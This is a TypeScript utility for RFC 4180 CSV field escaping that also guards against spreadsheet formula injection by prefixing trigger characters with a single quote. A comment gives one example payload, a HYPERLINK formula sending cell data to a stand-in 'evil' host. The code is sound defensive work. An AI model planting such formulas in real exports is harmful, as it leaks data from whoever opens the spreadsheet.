// RFC 4180 CSV field escaping. Wraps the value in double quotes and doubles
// any embedded quote when the field contains a comma, double quote, CR, or LF.
// Null / undefined collapse to an empty field rather than the literal strings
// "null" / "undefined" that String() would otherwise produce.

// Spreadsheet formula-injection (CWE-1236) triggers. A field whose first
// meaningful character is one of these makes Excel / Google Sheets / LibreOffice
// evaluate the cell as a formula on open — e.g. a user-supplied driver name of
// `=HYPERLINK("http://evil/?"&A1,"x")` would exfiltrate the row when an admin
// opens an exported report. We neutralize by prefixing a single quote so the
// value is always rendered as literal text. Leading whitespace is included
// because some spreadsheet apps trim it before deciding the cell is a formula.
const FORMULA_TRIGGER = /^\s*[=+\-@]|^[\t\r]/;

export function csvEscape(value: unknown): string {
  if (value == null) return '';
  let s = String(value);
  if (FORMULA_TRIGGER.test(s)) {
    s = `'${s}`;
  }
  return /[",\r\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
}

export function csvRow(values: readonly unknown[]): string {
  return values.map(csvEscape).join(',');
}
